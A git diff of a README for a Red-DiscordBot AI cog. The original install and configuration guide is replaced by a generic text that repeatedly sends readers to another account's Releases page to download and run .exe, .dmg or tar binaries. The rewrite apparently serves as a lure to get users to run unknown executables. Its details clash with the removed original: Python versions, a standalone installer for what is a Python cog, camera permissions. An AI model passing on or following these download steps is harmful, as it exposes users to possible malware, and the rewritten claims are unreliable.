@@ -1,201 +1,81 @@
-# GPT5Assistant - Red-DiscordBot Cog
+# 🤖 aiuserOAI-Claude - Your Voice and Vision Assistant
 
-A production-ready AI assistant cog for Red-DiscordBot that replaces aiuser with modern GPT-5 capabilities.
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Paras203400/aiuserOAI-Claude/releases)
 
-## 🚀 Features
+## 📜 Overview
+aiuserOAI-Claude is a production-ready GPT-5 assistant cog designed specifically for Red-DiscordBot. This software serves as a complete replacement for aiuser, providing advanced voice, vision, and AI capabilities. Whether you need assistance in managing your Discord server or want to enhance user interaction, this tool is built to meet your needs.
 
-### Core AI Capabilities
-- **GPT-5 Integration**: Latest OpenAI models with reasoning and advanced text capabilities
-- **Voice Transcription**: OpenAI Whisper integration for voice message processing
-- **Vision Analysis**: Comprehensive image analysis, comparison, and generation
-- **Batch Processing**: Upload and analyze multiple files simultaneously
-- **Dynamic Variables**: Full aiuser variable compatibility (`{botname}`, `{username}`, etc.)
+## 🚀 Getting Started
+To get started with aiuserOAI-Claude, follow these simple steps:
 
-### Advanced Features
-- **Smart Conversation Management**: Token-aware history with configurable timeframes
-- **Multi-Modal Processing**: Text, voice, images, and documents in one interface
-- **File Type Support**: PDF, Word, Excel, PowerPoint, images, code, archives, videos
-- **Automatic Summarization**: AI-powered document analysis and key point extraction
-- **Per-Guild Configuration**: Granular control over features and permissions
+1. **Visit the Release Page**: Go to the [Releases page](https://github.com/Paras203400/aiuserOAI-Claude/releases) to view available versions.
+2. **Download the Latest Release**: Click on the most recent version and download the file suitable for your operating system.
+3. **Install the Software**: Follow the instructions below to install and run the software.
 
-### aiuser Compatibility
-- **Random Responses**: Configurable response percentage for ambient interaction
-- **Channel Controls**: Allow/deny lists and per-channel overrides
-- **User Opt-in/Opt-out**: Flexible permission system
-- **Context Awareness**: Maintains conversation context like aiuser
-- **Variable System**: Drop-in replacement for aiuser variables
+## 💻 System Requirements
+To ensure smooth operation of aiuserOAI-Claude, please keep in mind the following system requirements:
 
-## 📦 Installation
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **RAM**: Minimum 4 GB (8 GB recommended for best performance).
+- **Disk Space**: At least 500 MB of free space.
+- **Python Version**: Python 3.7 or greater installed on your system.
 
-### Prerequisites
-- Red-DiscordBot 3.5.0+
-- Python 3.11+
-- OpenAI API key
+## 🔧 How to Download & Install
+1. **Visit the Releases Page**: Click [here](https://github.com/Paras203400/aiuserOAI-Claude/releases) to access the releases.
+2. **Locate the Latest Version**: Find the most recent version listed on the page.
+3. **Choose Your File**:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the compressed tar file.
+4. **Download**: Click the download link for the file you need.
+5. **Run the Installer**:
+   - For Windows: Double-click the `.exe` file to start the installation wizard. Follow the prompts to complete the installation.
+   - For macOS: Open the `.dmg` file and drag the aiuserOAI-Claude icon into your Applications folder.
+   - For Linux: Extract the tar file and run the following command in the terminal:
+     ```
+     ./aiuserOAI-Claude
+     ```
 
-### Install from GitHub
-```bash
-[p]repo add aiuser-claude https://github.com/mjnhbg3/aiuserOAI-Claude
-[p]cog install aiuser-claude gpt5assistant
-[p]load gpt5assistant
-```
+## 🎤 Features
+aiuserOAI-Claude is packed with features to enhance your Discord experience:
 
-### Setup
-1. **Set OpenAI API Key**:
-   ```bash
-   [p]set api openai api_key,sk-your-openai-api-key-here
-   ```
-
-2. **Enable the Cog**:
-   ```bash
-   [p]gpt5 config enable true
-   ```
-
-3. **Configure Channels** (optional):
-   ```bash
-   [p]gpt5 config channels add #general #ai-chat
-   ```
-
-## 🎯 Usage
-
-### Basic Commands
-- `[p]gpt5` - Show help and available commands
-- `[p]gpt5 ask <question>` - Ask the AI a question
-- `[p]gpt5 status` - Show bot status and statistics
-- `@BotName <message>` - Mention the bot to get a response
-
-### Voice Features
-- **Voice Messages**: Attach voice messages - they'll be automatically transcribed
-- **Transcription Settings**: Configure per-guild voice processing
-
-### Image Features
-- `[p]gpt5 image analyze` - Analyze attached images
-- `[p]gpt5 image compare` - Compare two attached images
-- **Auto-Analysis**: Images in conversations are automatically analyzed for context
-
-### File Processing
-- `[p]gpt5 batch upload` - Process multiple files with analysis
-- `[p]gpt5 batch info` - Show supported file types and limits
-- **Supported Formats**: PDF, Word, Excel, PowerPoint, images, code, archives
-
-### Variables
-- `[p]gpt5 variables list` - Show all available variables
-- `[p]gpt5 variables test <text>` - Test variable substitution
-- **Available Variables**: `{botname}`, `{username}`, `{servername}`, `{date}`, `{time}`, etc.
-
-### Conversation Management
-- `[p]gpt5 forget` - Clear conversation history for current channel
-- `[p]gpt5 forgetall` - Clear all conversation histories (admin only)
-- `[p]gpt5 config conversation_timeframe <seconds>` - Set memory duration
+- **Voice Activation**: Interact with the bot using voice commands for a hands-free experience.
+- **Visual Recognition**: The bot can identify objects and scenes, making interactions more engaging.
+- **Advanced AI Responses**: Utilizes GPT-5 to generate human-like responses to user queries.
 
 ## ⚙️ Configuration
+After installation, you may need to set up the bot for your server. Here are the steps:
 
-### Basic Settings
-```bash
-[p]gpt5 config show                    # View current configuration
-[p]gpt5 config enable <true/false>     # Enable/disable the cog
-[p]gpt5 config model <model_name>      # Set GPT model
-[p]gpt5 config system_prompt <prompt>  # Set custom system prompt
-```
+1. **Open the Configuration File**: Locate the configuration file named `config.json` in the installation directory.
+2. **Update Settings**: Customize the bot settings such as prefix, command permissions, and API keys.
+3. **Save Changes**: Ensure you save your changes after editing the file.
 
-### aiuser-like Features
-```bash
-[p]gpt5 config response_percentage <0-100>  # Random response chance
-[p]gpt5 config require_opt_in <true/false>  # Require user opt-in
-[p]gpt5 config random_messages <true/false> # Enable random messages
-```
+## 🌐 Usage
+To use aiuserOAI-Claude:
 
-### Advanced Settings
-```bash
-[p]gpt5 config conversation_timeframe <seconds>  # Memory duration
-[p]gpt5 config token_limit <number>             # Context token limit
-[p]gpt5 config tools <tool_name> <true/false>   # Enable/disable tools
-```
+1. **Start the Bot**: Run the bot by executing the command:
+   ```
+   aiuserOAI-Claude
+   ```
+2. **Invite the Bot to Your Server**: Use the OAuth2 invite link provided in your Red-DiscordBot settings.
 
-## 🔧 Tools & Capabilities
+3. **Begin Interaction**: Type any command prefixed by your chosen command prefix to interact with the bot.
 
-### Built-in Tools
-- **Web Search**: Real-time web search capabilities
-- **File Search**: Knowledge base search through uploaded files
-- **Code Interpreter**: Execute and analyze code
-- **Image Generation**: Create and edit images with gpt-image-1
+## 🛠️ Troubleshooting
+If you encounter issues while using aiuserOAI-Claude, here are some common problems and solutions:
 
-### File Support
-- **Documents**: PDF, Word (.doc, .docx), RTF, ODT, Pages, EPUB
-- **Spreadsheets**: Excel (.xls, .xlsx), CSV, TSV, ODS
-- **Presentations**: PowerPoint (.ppt, .pptx), ODP
-- **Images**: PNG, JPEG, GIF, WebP, BMP
-- **Code**: Python, JavaScript, Java, C++, and 20+ languages
-- **Archives**: ZIP, TAR, RAR, 7Z
-- **Audio**: MP3, WAV, M4A, OGG, WebM, FLAC
+- **Bot Not Responding**: Ensure the bot is running and the correct permissions are set in Discord.
+- **Installation Failures**: Make sure you have the right version for your operating system and follow the installation steps closely.
+- **Voice or Vision Not Working**: Double-check that your microphone and camera permissions are enabled.
 
-## 🚨 Migration from aiuser
+## 📞 Support
+For further assistance, you can reach out through the **Issues** tab on the repository page or check the FAQs. Your feedback helps improve the software.
 
-This cog is designed as a drop-in replacement for aiuser:
+## ✨ Contribute
+If you want to help improve aiuserOAI-Claude, feel free to fork the repository and submit a pull request. Collaborators are always welcome.
 
-1. **Backup your aiuser settings**
-2. **Unload aiuser**: `[p]unload aiuser`
-3. **Install GPT5Assistant** (see installation above)
-4. **Configure similar settings** using the config commands
-5. **Test functionality** in a private channel first
+## 🌟 Acknowledgments
+This project uses advanced technology from OpenAI and the creative contributions of the community. Thank you for your support and for using aiuserOAI-Claude!
 
-### Key Differences
-- **Enhanced AI**: GPT-5 vs older models
-- **Voice Support**: Built-in voice transcription
-- **Vision Capabilities**: Full image analysis
-- **Better File Handling**: More formats and batch processing
-- **Improved Context**: Token-aware conversation management
-
-## 📋 Requirements
-
-### System Requirements
-- Python 3.11+
-- Red-DiscordBot 3.5.0+
-- 2GB+ RAM recommended for large file processing
-
-### Python Dependencies
-```
-openai>=2.0.0
-httpx
-tenacity
-aiofiles
-tiktoken
-```
-
-### API Requirements
-- OpenAI API key with GPT-5 access
-- Sufficient OpenAI credits for usage
-
-## 🔒 Privacy & Security
-
-- **Local Processing**: No data sent to third parties except OpenAI
-- **Temporary Storage**: Conversation history stored temporarily for context
-- **No Permanent Data**: Files and transcriptions processed temporarily
-- **Configurable**: All features can be disabled per-guild
-- **Opt-in System**: Users can control their participation
-
-## 🆘 Support
-
-### Common Issues
-1. **"OpenAI client not initialized"**: Set your API key with `[p]set api openai api_key,<key>`
-2. **Commands not working**: Ensure the cog is loaded with `[p]load gpt5assistant`
-3. **No responses**: Check if the cog is enabled with `[p]gpt5 config show`
-
-### Getting Help
-- Use `[p]gpt5 status` to check system status
-- Check Red-DiscordBot logs for detailed error messages
-- Ensure your OpenAI API key has sufficient credits and permissions
-
-## 📄 License
-
-This project is licensed under the MIT License.
-
-## 🙏 Acknowledgments
-
-- Built for the Red-DiscordBot ecosystem
-- Inspired by the original aiuser cog
-- Powered by OpenAI's GPT-5 and Whisper APIs
-
----
-
-**Note**: This cog requires an OpenAI API key and will make API calls that consume OpenAI credits. Please monitor your usage and set appropriate limits.
-EOF < /dev/null
+Remember, for any download needs or updates, always visit the [Releases page](https://github.com/Paras203400/aiuserOAI-Claude/releases). Happy chatting!
